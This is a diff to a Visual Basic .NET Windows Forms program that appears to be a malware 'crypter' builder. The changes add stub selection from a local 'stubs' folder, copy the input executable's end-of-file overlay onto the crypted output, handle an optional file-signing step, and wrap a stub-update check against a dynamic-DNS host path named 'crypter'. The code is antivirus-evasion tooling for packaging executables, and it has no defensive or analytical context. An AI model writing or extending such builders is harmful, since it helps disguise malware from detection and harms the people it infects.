@@ -29,9 +29,27 @@ Public Class Form1
     End Function
 
     Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
+        Dim StubPath As String = Application.StartupPath & "\stubs\" & CurrentStub
+        Dim Stub() As Byte
         If TextBox1.Text = "" Then Exit Sub
         ' 
-        Dim Stub() As Byte = FileIO.FileSystem.ReadAllBytes(Application.StartupPath & "\stubs\" & CurrentStub)
+        If CurrentStub = "" Then
+            Dim OFD As New OpenFileDialog
+            With OFD
+                .Title = "Select Stub"
+                .InitialDirectory = Application.StartupPath & "\stubs"
+                .ShowDialog()
+            End With
+            If OFD.FileName <> "" Then
+                Stub = FileIO.FileSystem.ReadAllBytes(OFD.FileName)
+            Else
+                MsgBox("must select stub")
+                Exit Sub
+            End If
+        Else
+            Stub = FileIO.FileSystem.ReadAllBytes(Application.StartupPath & "\stubs\" & CurrentStub)
+        End If
+
         Dim SFD As New SaveFileDialog
         With SFD
             .FileName = ""
@@ -55,7 +73,12 @@ Public Class Form1
             Application.DoEvents()
             System.Threading.Thread.Sleep(50)
 
-
+            'replace EOF data
+            Dim OverLay() As Byte = ReadEOFData(TextBox1.Text)
+            If OverLay Is Nothing Then
+            Else
+                FileIO.FileSystem.WriteAllBytes(SFD.FileName, OverLay, True)
+            End If
             If CheckBox2.Checked = True Then
                 SignFile(SFD.FileName)
             End If
@@ -65,6 +88,50 @@ Public Class Form1
         End If
 
     End Sub
+
+    Public Function ReadEOFData(ByRef FilePath As String) As Byte()
+        Dim Bin() As Byte = FileIO.FileSystem.ReadAllBytes(FilePath)
+        Dim i As Integer = Bin.Length - 1
+        Dim Found As Boolean = False
+        Dim Found2 As Boolean = False
+        Dim Found3 As Boolean = False
+
+        Do Until i = 0
+            If Bin(i) = &H0 Then
+                If Found = False Then
+                    Found = True
+                Else
+                    If Found2 = False Then
+                        Found2 = True
+                    Else
+                        If Found3 = False Then
+                            'exit function
+                            i += 3
+                            Exit Do
+
+                        End If
+                    End If
+                End If
+            Else
+                Found = False
+                Found2 = False
+                Found3 = False
+            End If
+            i -= 1
+        Loop
+
+        Dim Size As Integer = (Bin.Length - 1) - i
+        Dim OverLay(0 To Size) As Byte
+        If OverLay.Length = 0 Then Return Nothing
+        Dim a As Integer = 0
+        Do Until i = Bin.Length - 1
+            OverLay(a) = Bin(i)
+            i += 1
+            a += 1
+        Loop
+        Return OverLay
+    End Function
+
 
     Public Shared Function Compress(bytes As Byte()) As Byte()
         Dim stream = New IO.MemoryStream()
@@ -173,6 +240,7 @@ Public Class Form1
 
     End Function
 
+
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         ListView1.Columns.Add("File Name", 100, HorizontalAlignment.Center) 'Column 1
         ListView1.Columns.Add("File Path", 100, HorizontalAlignment.Center) 'Column 2
@@ -181,7 +249,13 @@ Public Class Form1
 
         'checking for stub update
         Dim Wc As New Net.WebClient
-        Dim Restult As String = Wc.DownloadString("http://intellisence.ddns.net/crypter/index.php")
+        Dim Restult As String = ""
+        Try
+            Restult = Wc.DownloadString("http://intellisence.ddns.net/crypter/index.php")
+        Catch ex As Exception
+            Exit Sub
+        End Try
+
         CurrentStub = Restult
         If FileIO.FileSystem.DirectoryExists("stubs") Then
             'loop through the files and see if current stub exists
